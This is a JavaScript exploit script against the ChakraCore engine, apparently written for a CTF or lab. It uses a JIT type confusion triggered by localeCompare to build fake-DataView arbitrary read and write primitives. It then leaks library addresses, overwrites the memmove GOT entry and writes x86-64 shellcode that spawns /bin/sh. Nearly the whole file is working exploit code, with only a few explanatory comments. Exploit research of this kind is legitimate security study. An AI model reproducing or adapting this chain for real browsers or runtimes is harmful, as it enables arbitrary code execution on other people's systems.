// Uint32 to Int32
function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    if (x < 0) {
        return 0x100000000 + x;
    }
    return x;
}

function hex(x) {
    return `0x${x.toString(16)}`
}


// memory for our fake DataView
var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
// the array we will exploit
var arr = [2.2, 2.2,3.3,4.4];
// helpers to convert between a double and int[2]
var f64 = new Float64Array(1), i32 = new Int32Array(f64.buffer);
var fake_obj_addr=null;
var dv;

function write32(addr_hi, addr_lo, value) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    DataView.prototype.setInt32.call(dv, 0, value, true);
}


function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}   

function print64(int64_value, message){
    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16));
}

function exploit(){

    function opt(arr, callback) {
        arr[0] = 1.1; 

        if (callback!== null) {
            let tmp = 'a'.localeCompare(callback);
        }
        // read object address 
        
        f64[0] = arr[1]; //this is the VarType value returned to f64
        var base_lo = i32[0]   //addr of fakeobj.low
        var base_hi = i32[1];   //fakeobk.high
        // corrupt element to point to fake_object data 
        i32[0] = base_lo + 0x58; //add 0x58 to point to fake dataview
        arr[1] = f64[0]; //store the fake dataview addr to arr[1]

        fake_obj_addr=arr[1];
        
        // Construct our fake DataView
        // vtable
        fake_object[0] = 0 ;  fake_object[1] = 0;
        // Type*
        fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
        // (TypeId for fake Type object)
        fake_object[4] = 58;                     fake_object[5] = 0;
        // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
        fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
        // Buffer size
        fake_object[8] = 0x200;                  fake_object[9] = 0;
        // ArrayBuffer pointer, +0x3C IsDetached
        fake_object[10] = base_lo + 0x58 - 0x20; fake_object[11] = base_hi;
        // Buffer address
        fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;
        
        array_addr_hi = i32_to_u32(base_hi);
        array_addr_lo = i32_to_u32(base_lo);
    }

    for (let i = 0; i < 100; i++) {
        'a'.localeCompare('x', []);  // Optimize the JavaScript localeCompare

        opt(arr, null);  // for profiling all instructions in opt.

        try {
            opt(arr, {toString: () => {
                throw 1;  // Don't profile "if (locales === undefined && options === undefined) {"
            }});
        } catch (e) {

        }
    }

    opt(arr, { toString: () => { 
        arr[1] = fake_object; 
    }});

    dv = arr[1] //fake dataview (not addr but impl)
    
    //print(dv)
    var leak = read64(array_addr_hi, array_addr_lo);
    var fakedv = { hi : leak.hi, lo : leak.lo  };
    print64(fakedv , '[*] Fake dataview addr @ ');//addr of fake dataview
    var chakralib = { hi: fakedv.hi,lo:fakedv.lo+0x7f2a9aabb000-0x7f2a9b8a8ca8}
    print64(chakralib,'[*] chakralib addr @ ')
    
    var memmove_got = {hi:chakralib.hi,lo:chakralib.lo+0xE37128}
    print64(memmove_got,'[*] memmove_got addr @ ')

    var value_in_memmovegot = read32(memmove_got.hi,memmove_got.lo)
    //print(i32_to_u32(value_in_memmovegot).toString(16))

    write32(memmove_got.hi,memmove_got.lo,value_in_memmovegot+0x7ffff4a41000-0x00007ffff3d711b6);

    var shellcodeaddr = value_in_memmovegot+0x7ffff4a41000-0x00007ffff3d711b6

    let shellcode=[0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x8, 0x6e69622f, 0x68732f, 0x89485756, 0x50fe6,0xcc]
    
    for(var i=0;i<shellcode.length;i++){
        write32(memmove_got.hi,shellcodeaddr+4*i,shellcode[i])
    }

    //trigger
    var target = new Uint8Array(0x1234);
    var bb = new Uint8Array(10);
    target.set(bb);
   
}
exploit()
